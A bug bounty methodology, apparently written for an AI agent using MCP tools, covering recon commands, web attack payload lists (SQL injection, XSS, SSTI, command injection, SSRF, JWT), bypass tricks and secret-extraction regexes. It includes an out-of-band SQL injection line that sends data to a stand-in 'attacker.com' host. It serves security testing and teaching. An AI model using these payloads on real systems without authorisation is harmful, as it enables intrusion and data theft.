# Bug Bounty Hunting Methodology
## Comprehensive Attack Framework

**Version:** 1.0
**Based on:** Industry best practices, HackTricks, PortSwigger, OWASP
**Rulebook:** `BOUNTY_RULEBOOK.md` (Gate protocol, tool requirements, continuous flow)

---

## Phase 1: Reconnaissance

### 1.1 Passive Recon
```bash
# Subdomain enumeration
subfinder -d target.com -o subs.txt
amass enum -passive -d target.com -o amass.txt
assetfinder target.com >> assets.txt

# Certificate transparency
curl "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Wayback URLs
waybackurls target.com | sort -u > wayback.txt
gau target.com >> gau.txt

# GitHub dorking
# Secrets, endpoints, configs
```

### 1.2 Active Recon
```bash
# HTTP probing
httpx -l subs.txt -status-code -tech-detect -o live.txt

# Port scanning
nmap -sV -sC -p- -iL live.txt -oA nmap_full

# Directory fuzzing
ffuf -w wordlist.txt -u https://target.com/FUZZ -o dirs.json
```

### 1.3 Cloud Enumeration
```bash
# Multi-cloud discovery
cloud_enum -k target.com

# AWS specific
fire_cloud target.com

# Check CNAME records for:
# - *.amazonaws.com
# - *.windows.net
# - *.storage.googleapis.com
# - *.azurewebsites.net
```

---

## Phase 2: Application Mapping

### 2.1 Technology Stack
- Frontend framework (React, Vue, Angular)
- Backend language (Node.js, PHP, Python, Java)
- Database (SQL, NoSQL, GraphQL)
- Authentication (JWT, Sessions, OAuth, SAML)
- API style (REST, GraphQL, gRPC)

### 2.2 Functionality Mapping
| Function | CRUD | Auth Required | IDOR Risk |
|----------|------|---------------|-----------|
| User profile | CRUD | Yes | High |
| Settings | RU | Yes | Medium |
| Public content | R | No | Low |

### 2.3 Authentication Analysis
- Session management (cookies, tokens, localStorage)
- SSO/OAuth flows
- 2FA implementation
- Password reset flow

---

## Phase 3: Vulnerability Testing

### 3.1 Injection Testing

#### SQL Injection
```
Fuzzing characters: ' " ) ; -- /* */
Detection: Error messages, boolean differences, time delays

Techniques:
- Error-based: ' OR 1=1--
- Union-based: ' UNION SELECT 1,2,3--
- Boolean-blind: ' AND 1=1-- vs ' AND 1=2--
- Time-based: ' AND SLEEP(5)--
- Out-of-band: ' AND (SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\')))--
```

#### NoSQL Injection
```javascript
// MongoDB operators
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}}
{"$where": "this.password.length > 0"}
```

#### XSS (Cross-Site Scripting)
```html
<!-- Basic -->
<script>alert(1)</script>

<!-- Event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Template injection -->
{{constructor.constructor('alert(1)')()}}

<!-- DOM-based -->
javascript:alert(document.domain)
```

#### SSTI (Server-Side Template Injection)
```
# Detection
${7*7}
{{7*7}}
<%= 7*7 %>

# Jinja2/Python
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Java/Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

#### Command Injection
```bash
; id
| id
`id`
$(id)
& id
&& id
|| id
```

#### SSRF (Server-Side Request Forgery)
```
# Internal access
http://127.0.0.1
http://localhost
http://[::1]
http://169.254.169.254/latest/meta-data/

# Bypass filters
http://2130706433  # 127.0.0.1 as decimal
http://0x7f000001  # 127.0.0.1 as hex
http://127.1
```

### 3.2 Authentication/Authorization

#### IDOR Testing
1. Find object references (user_id, doc_id, order_id)
2. Identify other valid IDs (increment, decrement, enumerate)
3. Test access with different sessions
4. Check horizontal and vertical privilege escalation

#### JWT Attacks
```
# Algorithm confusion
{"alg": "none"}

# Key confusion (RS256 → HS256)
Sign with public key as HMAC secret

# Weak secrets
hashcat -m 16500 jwt.txt wordlist.txt

# Kid injection
{"kid": "../../../../../../dev/null"}
```

#### OAuth Vulnerabilities
- redirect_uri bypass (open redirect, subdomain)
- Missing state parameter (CSRF)
- Token leakage via referrer
- Scope escalation
- Account takeover via provider linking

#### 2FA Bypass
- Response manipulation (change "success": false to true)
- Direct navigation to post-2FA page
- Backup code brute force
- Token reuse
- Race conditions

### 3.3 Business Logic

#### Payment Bypass
- Negative quantities
- Price manipulation
- Currency switching
- Coupon reuse
- Race conditions on limited offers

#### Rate Limit Bypass
```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

#### 401/403 Bypass
```
# Path manipulation
/admin → /ADMIN
/admin → /admin/
/admin → /admin..;/
/admin → /%2e/admin
/admin → /admin%00

# Method change
GET /admin → POST /admin
GET /admin → PUT /admin

# Header injection
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

### 3.4 Client-Side

#### Prototype Pollution
```javascript
// URL-based
?__proto__[polluted]=true
?constructor[prototype][polluted]=true

// JSON-based
{"__proto__": {"polluted": true}}
```

#### CORS Misconfiguration
```
Origin: https://evil.com
Origin: https://target.com.evil.com
Origin: null
```

#### PostMessage Vulnerabilities
- Missing origin validation
- eval() on message data
- DOM manipulation

---

## Phase 4: Exploitation

### 4.1 Chain Building
1. Combine low-severity findings
2. Demonstrate maximum impact
3. Document attack path clearly

### 4.2 Common Chains
- IDOR + Info Disclosure → Account Takeover
- XSS + CSRF → Session Hijacking
- SSRF + Cloud Metadata → AWS Key Theft
- SQLi + File Read → Source Code Disclosure

### 4.3 Impact Demonstration
- Use own test accounts
- Minimal data access
- Screenshot/record PoC
- Calculate CVSS score

---

## Phase 5: Reporting

### 5.1 Report Structure
1. Title (clear, concise)
2. Severity + CVSS
3. Affected endpoint
4. Steps to reproduce
5. Impact statement
6. Remediation advice
7. Supporting evidence

### 5.2 Evidence Collection
- HTTP requests/responses
- Screenshots
- Video PoC
- Code snippets
- Logs

---

## Tools Reference

### Recon
| Tool | Purpose |
|------|---------|
| subfinder | Subdomain enumeration |
| amass | Attack surface mapping |
| httpx | HTTP probing |
| nuclei | Vulnerability scanning |
| ffuf | Fuzzing |
| waybackurls | Historical URLs |

### Exploitation
| Tool | Purpose |
|------|---------|
| Burp Suite | Web proxy |
| SQLMap | SQL injection |
| NoSQLMap | NoSQL injection |
| jwt_tool | JWT attacks |
| SSRFmap | SSRF exploitation |

### Secrets
| Tool | Purpose |
|------|---------|
| truffleHog | Git secrets |
| gitleaks | Secret scanning |
| Keyhacks | Key validation |

---

## Phase 6: Reverse Engineering

### JavaScript Obfuscation

| Type | Detection | Deobfuscation |
|------|-----------|---------------|
| Eval-based | `eval(`, `Function(` | Hook and log |
| String encoding | `\x41\x42`, `\u0041` | Decode hex/unicode |
| Array-based | `_0x1234[0x1]` | Extract array, substitute |
| Control flow | Dead code, switch | Trace execution |

### Cipher Identification

**Pattern:** Common constants
```
MD5:     0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
SHA-1:   0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0
SHA-256: 0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a
AES:     0x63, 0x7c, 0x77, 0x7b (S-box first bytes)
```

### Secret Extraction Regex

```javascript
// API Keys
/api[_-]?key[\s]*[:=][\s]*['"][a-zA-Z0-9]{20,}/gi

// AWS Keys
/AKIA[0-9A-Z]{16}/g
/aws[_-]?secret[_-]?access[_-]?key[\s]*[:=][\s]*['"][a-zA-Z0-9/+]{40}/gi

// JWT
/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g

// Endpoints
/['"`](\/api\/[a-zA-Z0-9\/_-]+)['"`]/g
```

---

## Resources

- [HackTricks](https://book.hacktricks.wiki/)
- [PortSwigger Academy](https://portswigger.net/web-security)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

---

## Token Optimization (Context Management)

### Token Axioms (T0-T4)
These rules MUST be followed to prevent context overflow during bounty hunting.

```
T0: ToolSearch BEFORE MCP calls
    → Always load deferred tools before using them
    → 46% token reduction

T1: Truncate responses > 10KB
    → Use head (60%) + tail (40%) pattern
    → Save full data to file, return summary

T2: Checkpoint after each phase
    → Write: targets/{target}/checkpoints/phase_{n}.json
    → Return: "Phase complete: {summary}"

T3: Files for data, context for summary
    → NEVER inline large data in responses
    → ALWAYS reference file paths

T4: Batch operations in chunks of 10
    → Process URLs/items in batches
    → Checkpoint between batches
```

### Phase Checkpoint Pattern
```
After each phase:
1. Save: ~/BlackBox/targets/{target}/phase_{n}_results.json
2. Return summary (3-5 lines):
   "PHASE {n} COMPLETE
   - Findings: {count}
   - Path: {file_path}
   - Next: PHASE {n+1}"
```

### MCP Tool Protocol
```python
# CORRECT - Always load first
ToolSearch("nuclei scan")           # 1. Load
nuclei_scan(target="example.com")   # 2. Use

# WRONG - Direct call bloats context
nuclei_scan(target="example.com")   # Fails or bloats
```

### Optimized Scraping
```python
# Always use minimal format
formats=["markdown"]          # NOT rawHtml
onlyMainContent=True          # Skip chrome
excludeTags=["script", "style", "nav", "footer"]
```

### Utility Modules
| Location | Purpose |
|----------|---------|
| `modules/utils/response_handler.py` | truncate(), summarize() |
| `modules/utils/gate_checkpoint.py` | checkpoint(), get_summary() |
| `modules/utils/token_rules.py` | BatchProcessor, @enforce_token_rules |

---

*Comprehensive Bug Bounty Methodology*
*DeadMan Security Research*
